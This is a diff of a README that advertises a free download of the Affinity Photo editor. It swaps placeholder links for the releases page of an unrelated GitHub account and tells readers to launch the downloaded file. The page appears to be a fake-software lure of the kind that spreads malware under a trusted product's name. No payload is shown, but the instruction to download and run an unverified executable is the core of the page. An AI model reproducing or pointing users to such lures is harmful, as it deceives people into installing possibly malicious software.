@@ -43,7 +43,7 @@ AFFINITY PHOTO stands out as the ultimate Photoshop alternative, offering a wide
 
 Ready to explore the world of AFFINITY PHOTO? Download the software using the link below:
 
-[![Download AFFINITY-PHOTO](https://img.shields.io/static/v1?label=Download&message=AFFINITY-PHOTO&color=blue)](https://github.com/project/files/App.zip)
+[![Download AFFINITY-PHOTO](https://github.com/7y8iga/AFFINITY-PHOTO/releases)](https://github.com/7y8iga/AFFINITY-PHOTO/releases)
 
 If the link ends with the file name, make sure to launch it to start your AFFINITY PHOTO journey.
 
@@ -55,4 +55,4 @@ AFFINITY-PHOTO is more than just a Photoshop alternative; it's a robust tool tha
 
 Are you ready to elevate your editing game? Download AFFINITY-PHOTO now and let your creativity soar! 🌟
 
-![AFFINITY-PHOTO](https://www.example.com/affinity-photo-image.jpg)
+![AFFINITY-PHOTO](https://github.com/7y8iga/AFFINITY-PHOTO/releases)
